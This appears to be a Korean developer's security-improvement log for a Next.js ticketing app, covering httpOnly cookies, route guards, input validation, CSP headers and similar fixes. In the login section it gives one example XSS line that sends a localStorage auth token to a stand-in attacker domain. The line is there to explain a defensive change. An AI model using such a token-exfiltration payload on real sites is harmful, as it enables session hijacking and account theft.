# TICKET RUSH — 보안 개선 기록

프로젝트에 적용한 보안 조치를 **페이지/영역별로** 정리한 문서. 추후 보안 학습 시 레퍼런스 용도.

---

## 📍 로그인 / 회원가입 (`/login`, `/signup`)

### 보안 문제 유형: 세션 토큰 저장 위치 (XSS 대응)

**문제**  
로그인 성공 시 백엔드가 준 `accessToken`을 `localStorage`에 저장하고 있었음. `localStorage`는 JavaScript로 자유롭게 접근 가능 → **XSS 발생 시 한 줄로 토큰 탈취**되어 세션 하이재킹으로 이어짐.

```js
// 공격 예시 - XSS 시 한 줄로 탈취
fetch("https://공격자.com/steal?token=" + localStorage.getItem("auth_token"));
```

**조치 (HIGH-02)**

- 백엔드가 `Set-Cookie: accessToken=...; HttpOnly; Secure; SameSite=Strict`로 심음
- 프론트는 `Authorization: Bearer` 헤더 로직 완전 삭제 → `credentials: 'include'`로 쿠키 자동 전송
- `AuthContext.tsx`의 login 응답 파싱을 `{ userInfo }`만 받도록 변경 (accessToken 필드 제거)
- refresh 로직도 body 파싱 불필요 → 백엔드가 새 쿠키로 자동 갱신

**결과**  
JS는 이제 토큰 존재 자체를 알 수 없음. XSS가 뚫려도 토큰 훔치기 불가능.

**학습 포인트**

- httpOnly 쿠키 vs localStorage: 편의성 vs 보안. 티켓팅/결제 등 민감 서비스는 httpOnly 필수
- CSRF 대응: httpOnly 쿠키는 CSRF에 취약해질 수 있음 → `SameSite=Strict`로 완화
- 프론트 검증 로직(이메일 정규식, 비밀번호 길이)은 UX 목적. 실제 검증은 백엔드에서 재실행

XSS
: 웹사이트가 사용자의 입력값을 제대로 검사 하지 않을 때 공격자가 악성 스크립틀르 웹사이트에 넣어 실행하는 보안 취약점
CSRF
: 로그인한 사용자가 자신의 의지와는 무관하게 공격자에 의해 수정, 삭제, 결제 등의 행위를 특정 웹사이트에서 요청하게 만드는 보안 취약점

---

## 📍 마이페이지 (`/my`)

### 보안 문제 유형: 페이지 접근 통제 (인가 / UX 보조)

**문제**  
로그인 필요 페이지인 `/my`에 비로그인 상태로 URL 직접 입력 시:

1. 마이페이지 UI가 잠깐 렌더링됨
2. API 호출 → 백엔드가 401 반환
3. `apiFetch`가 `forceLogout()` → `/login` 리다이렉트

→ 마이페이지 화면이 잠깐 깜빡이는 UX 문제 발생 (실제 데이터 노출은 백엔드가 막고 있어 없음)

**조치 (HIGH-01)**

- `src/app/my/layout.tsx` 신규 생성 (클라이언트 사이드 가드)
- `useAuth`로 로그인 확인 → 비로그인이면 페이지 렌더 전 `router.replace('/login')`
- `isLoading` 중이거나 비로그인이면 스피너만 표시, children(마이페이지 UI) 아예 렌더 안 함

**Next.js `middleware.ts`를 왜 안 썼는가?**  
서버 미들웨어는 `localStorage`를 못 읽음. 현재 아키텍처와 자연스럽게 안 맞음. HIGH-02(httpOnly 쿠키) 완료 후에는 미들웨어로도 전환 가능.

**학습 포인트**

- 미들웨어/클라이언트 가드는 **UX용**. 실제 보안 경계는 백엔드 `authMiddleware`
- 미들웨어 단독 보호는 `_next/data` 직접 요청으로 우회 가능 → 반드시 백엔드에서 재검증
- `router.push` vs `router.replace`: replace는 브라우저 히스토리에 안 남아 뒤로가기 방지

### 보안 문제 유형 2: 로그아웃 후 세션 잔존 (`Header.tsx`)

**문제**  
로그아웃 시 `router.push('/')` 만 호출:

- 브라우저 히스토리에 이전 페이지(`/my`) 남음 → 뒤로가기로 접근 시도 가능 (UX 문제)
- Next.js 서버 컴포넌트 캐시가 남아 로그인 상태 반영 안 됨 → "홍길동님 환영합니다" 등 이전 개인화 문구 그대로 표시

**조치 (LOW-03)**

```ts
const handleLogout = async () => {
  await logout();
  router.replace("/"); // 히스토리 덮어쓰기 (뒤로가기 방지)
  router.refresh(); // 서버 컴포넌트 강제 재렌더링
};
```

**학습 포인트**

- `router.push` → 히스토리에 쌓임 (뒤로가기 시 원래 페이지 복귀 가능)
- `router.replace` → 히스토리 덮어씀 (뒤로가기 방지, 인증 흐름에 적합)
- `router.refresh` → Next.js 서버 컴포넌트 캐시 무효화, 최신 상태 렌더링

---

## 📍 랭킹 (`/ranking`)

### 보안 문제 유형 1: 입력값 검증 (URL 파라미터 조작)

**문제**  
URL 쿼리스트링(`?eventId=5`)을 백엔드에 그대로 전달할 때 검증이 허술했음:

```ts
// Before
const rawEventId = params.eventId ? parseInt(params.eventId) : undefined;
const eventId = rawEventId && rawEventId >= 1 ? rawEventId : undefined;
```

- `parseInt` radix 미지정 → `"0x10"`이 16진수로 해석
- `parseInt("1abc") === 1` → 뒤 문자열 무시하고 통과
- 상한선 없음 → `"999999999999"` 그대로 백엔드 전달
- `params.eventId`가 배열로 들어올 수 있는 케이스 방어 없음

**조치 (HIGH-03)**

- 전용 헬퍼 `parsePositiveInt` 도입
  1. 정규식 `/^\d+$/`로 순수 숫자만 허용
  2. `Number.parseInt(value, 10)` radix 명시
  3. 범위 검증 (`1 <= n <= max`)
  4. 배열/undefined 방어 (`typeof value !== 'string'` 체크)
- URL 조립은 `URLSearchParams`로 → 자동 encoding + 안전

**학습 포인트**

- `parseInt`의 함정: radix 미지정 시 예측 불가
- 화이트리스트 검증(허용 값만 통과)이 블랙리스트보다 안전
- TypeScript 타입은 런타임을 보장 안 함. `searchParams`는 실제로 `string | string[] | undefined`
- `URLSearchParams` vs 문자열 템플릿: 특수문자 자동 encoding

### 보안 문제 유형 2: SSR fetch의 신뢰 경계 (외부 데이터 검증 / 에러 가시성)

**문제**  
랭킹 페이지는 서버 컴포넌트 → Next.js 서버가 백엔드 API 호출해서 HTML 렌더링. 이 fetch 로직이 허술했음:

- 에러를 조용히 `[]`로 삼킴 (Silent Failure) → 개발자가 장애 인지 못 함
- 응답 스키마 검증 없음 → 백엔드가 이상한 데이터 보내도 그대로 사용
- `cache: 'no-store'`로 매 요청마다 백엔드 호출 → 부하 증가
- `credentials` 미설정 → 향후 인증 랭킹 확장 시 불편

**조치 (MEDIUM-01)**

- `isValidRankEntry` 타입 가드 함수 도입 → 필드별 타입 검증 후 유효 항목만 필터링
- 캐시 정책 변경: `no-store` → `next: { revalidate: 30 }` (30초 재사용, 백엔드 부하 감소)
- 에러 로깅 추가 (`NODE_ENV !== 'production'` 조건부 → 프로덕션 정보 노출 방지)
- `credentials: 'include'` 추가 → 향후 개인화 랭킹 대비

**학습 포인트**

- **외부 데이터는 신뢰 경계**: TypeScript는 컴파일 타임만. 백엔드 응답은 런타임 검증 필수 (zod 등 라이브러리도 옵션)
- **Silent Failure의 위험**: 서비스 장애를 조기 감지할 수 있어야 함
- **Next.js 캐시 전략**: `no-store`(항상 신선) vs `revalidate`(허용 지연) — 데이터 성격에 따라 선택
- **프로덕션 로깅**: `console.error`는 브라우저 콘솔 노출 → 프로덕션에서는 Sentry 등 별도 도구로 전환

---

## 📍 연습모드 (`/practice`)

### 보안 문제 유형: 중복 요청 (클라이언트 사이드 Rate Limiting)

**문제**  
"예매하기" 버튼을 연속 클릭하면 백엔드에 세션이 여러 개 중복 생성됨:

- 서버 부하 증가
- 데이터 정합성 오염 (한 사용자가 여러 세션 소유)
- DoS 벡터로 악용 가능

**조치 (MEDIUM-02)**

- `useRef` (동기 lock) + `useState` (UI disabled) 이중 방어

  ```ts
  const [bookingPending, setBookingPending] = useState(false);
  const bookingLockRef = useRef(false);

  async function handleBooking() {
    if (bookingLockRef.current) return; // 동기 즉시 체크
    bookingLockRef.current = true;
    setBookingPending(true);
    // ... API 호출
  }
  ```

- 두 버튼 모두 `disabled={bookingPending}` + "진입 중..." 텍스트
- Lock 해제: 대기 화면 8초 종료 시점

**왜 ref + state 둘 다?**  
React state 업데이트는 비동기 → 연속 클릭 시 `bookingPending`이 아직 반영 안 된 채로 다음 클릭이 통과할 수 있음. `useRef`는 동기적으로 즉시 반영됨.

**학습 포인트**

- 클라이언트 rate limiting은 UX + 서버 부하 감소용. 진짜 방어는 백엔드
- React state와 ref의 반영 타이밍 차이
- Optimistic UI vs Blocking UI 트레이드오프

**남은 이슈 (백엔드 이관)**

- CAPTCHA는 현재 클라이언트에서 생성·검증 중 (`CaptchaModal.tsx`) → DevTools로 100% 우회 가능. 프론트 단독 해결 불가로 **백엔드에서 발급/검증하는 방식으로 후속 진행 예정** (MEDIUM-03)

### 보안 문제 유형 2: 예측 가능한 난수 (티켓 시리얼 위조)

**문제**  
티켓 시리얼 번호 생성에 `Math.random()` 사용 (`BookingFlow.tsx`).  
`Math.random()`은 PRNG(Pseudo-Random Number Generator)로 시드/시퀀스를 알면 다음 값 예측 가능. V8 엔진에서 실제 예측 취약점 이력 있음.

**조치 (LOW-02)**

```ts
const stubBuf = new Uint32Array(1);
crypto.getRandomValues(stubBuf);
const stubNum = String(stubBuf[0] % 100000).padStart(5, "0");
```

- `crypto.getRandomValues()`는 CSPRNG(Cryptographically Secure PRNG) → OS 하드웨어 랜덤 소스 사용, 예측 불가

**단, 유지한 부분**

- 좌석 색칠 시각 시뮬레이션(`BookingFlow.tsx:79`)의 `Math.random()`은 유일성 불필요 → 유지

**학습 포인트**

- `Math.random()` vs `crypto.*` 선택 기준:
  - 티켓/토큰/세션ID/nonce 등 예측 불가해야 하는 값 → `crypto.getRandomValues()` / `crypto.randomUUID()`
  - 게임 애니메이션, 시각 효과 등 → `Math.random()` OK

### 보안 문제 유형 3: 에러 정보 노출 (정찰 방어)

**문제**  
`catch` 블록에서 `console.error(msg, e)`로 예외 객체 그대로 출력 (`BookingFlow.tsx:125`).  
프로덕션 브라우저 콘솔에 백엔드 스택 트레이스가 노출되면 공격자에게:

- 서버 기술 스택 정보
- 디렉터리 구조
- 라이브러리 버전
- 취약점 힌트 (undefined 접근 위치 등)

**조치 (LOW-01)**

```ts
if (process.env.NODE_ENV !== "production") {
  console.error("세션 완료 처리 실패:", e);
}
```

**학습 포인트**

- 정찰(reconnaissance)은 실제 공격의 사전 단계. 공격자에게 정보 제공을 최소화
- 프로덕션은 별도 도구(Sentry 등)로 에러를 백엔드 로그에 수집, 사용자 콘솔은 clean하게

---

## 📍 프로젝트 전체 (Global)

### 보안 문제 유형: HTTP 보안 헤더 (심층 방어 / Defense in Depth)

**문제**  
아무 보안 헤더도 없어 다음 공격에 무방비:

- Clickjacking (투명 iframe으로 클릭 가로채기)
- MIME 스니핑 (업로드 파일에 스크립트 숨김)
- Referer 유출 (URL의 토큰 등이 외부 사이트로 새어나감)
- XSS (허가되지 않은 스크립트 실행)
- 권한 오남용 (몰래 카메라/마이크 접근)

**조치 (MEDIUM-04) — `next.config.ts`**

| 헤더                      | 값                                         | 방어 대상                       |
| ------------------------- | ------------------------------------------ | ------------------------------- |
| `X-Frame-Options`         | `DENY`                                     | Clickjacking (iframe 삽입 차단) |
| `X-Content-Type-Options`  | `nosniff`                                  | MIME 스니핑 (타입 추측 금지)    |
| `Referrer-Policy`         | `strict-origin-when-cross-origin`          | Referer 정보 유출               |
| `Content-Security-Policy` | 다중 지시자                                | XSS 방어 최종 병기              |
| `Permissions-Policy`      | `camera=(), microphone=(), geolocation=()` | 권한 오남용                     |

**CSP 핵심 지시자**

- `default-src 'self'` — 기본은 우리 도메인만
- `connect-src 'self' <API_ORIGIN>` — fetch/XHR 대상 제한. **XSS 성공해도 데이터를 공격자 서버로 못 보냄**
- `frame-ancestors 'none'` — iframe 삽입 차단 (X-Frame-Options 백업)
- `form-action 'self'` — 폼 제출 대상 제한
- `base-uri 'self'` — `<base href>` 조작 방지

**학습 포인트**

- **CSP + httpOnly 쿠키 조합의 위력**:
  ```
  XSS 발생 → 스크립트 실행 시도
    → 토큰 훔치기: httpOnly 쿠키라 실패
    → 훔친 데이터 유출: CSP connect-src로 차단
  → 공격 실패
  ```
- **심층 방어**: 한 겹이 뚫려도 다음 층에서 막을 수 있도록 여러 겹으로 배치
- **CSP는 파괴적**: 도입 후 이미지·폰트·외부 스크립트 로딩 문제 발생 가능 → 콘솔 위반 경고 확인 필수
- **`unsafe-inline` / `unsafe-eval`**: Next.js 개발 모드에 필요하지만 방어 약화. 프로덕션은 **nonce** 방식으로 강화 권장

### 보안 문제 유형: 환경변수 관리 (시크릿 누출 / 배포 설정 사고)

**문제**

- `.env*` 파일이 하나도 없어 팀원이 어떤 환경변수 필요한지 알 수 없음
- `.gitignore`의 `.env*` 패턴이 `.env.example`(공유 템플릿)까지 무시
- `api.ts`에 `"http://localhost:3001/api"` 하드코딩 fallback → 프로덕션에서 환경변수 누락 시 실서비스가 localhost 호출하는 사고 발생 가능

**조치 (MEDIUM-05)**

- `.gitignore`에 `!.env.example` 예외 추가 → 템플릿만 커밋 허용
- `.env.example` 신규 파일: 필요 키 나열 + 주석
- `api.ts`에 프로덕션 미설정 시 콘솔 에러 로그 추가

**학습 포인트**

- **`NEXT_PUBLIC_` 접두사의 함정**: 클라이언트 번들에 그대로 포함됨 → **시크릿 절대 금지**. API URL, feature flag 정도만 OK
- **`.env.example` 관행**: 공유 템플릿은 커밋, 실제 값(`.env.local`)은 무시
- **환경변수 검증 시점**: 이상적으로는 빌드 스크립트에서 fail-fast. 최소한 런타임 경고

---

## 🤝 백엔드 협업 사항

프론트 단독으로 해결 불가능하여 백엔드 수정이 필요했던 항목.

### 1. httpOnly 쿠키 전환 (로그인 페이지 참조) — 완료

백엔드 수정 내용:

- `auth.controller.ts`: `login`/`refresh`에서 `res.cookie("accessToken", ...)`로 심음, JSON body에서 `accessToken` 필드 제거
- `authMiddleware.ts`: `req.cookies?.accessToken`을 Authorization 헤더보다 우선 읽음 (헤더는 하위호환)
- `app.ts` CORS: `credentials: true` + `origin`에 정확한 프론트 도메인 지정 (와일드카드 `*` 금지)

### 2. CAPTCHA 서버 검증 방식 (연습모드 참조) — 후속 예정

- 현재: 클라이언트에서 코드 생성·검증 → DevTools로 100% 우회 가능
- 목표: 백엔드에서 CAPTCHA 이미지+토큰 발급, 사용자 입력을 백엔드에서 검증
- 또는 hCaptcha/reCAPTCHA 등 검증된 서드파티 도입

---

## 🎯 원칙 요약 (한 줄로)

| 원칙                      | 의미                                          |
| ------------------------- | --------------------------------------------- |
| **백엔드가 최종 방어선**  | 프론트 검증은 UX 보조, 진짜 방어는 API에서    |
| **화이트리스트 우선**     | 블랙리스트보다 화이트리스트가 안전            |
| **심층 방어**             | 단일 방어에 의존 금지, 여러 층으로 보호       |
| **민감 정보는 JS 밖으로** | httpOnly 쿠키 등으로 JS 접근 자체를 차단      |
| **최소 권한 원칙**        | 필요한 것만 허용 (Permissions-Policy, CSP 등) |

---

## 📚 참고 자료

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- MDN Security: https://developer.mozilla.org/en-US/docs/Web/Security
- Content Security Policy Reference: https://content-security-policy.com/
- 프로젝트 내 `.claude/agents/security.md`: 보안 에이전트 규칙 (점검 항목 체크리스트)
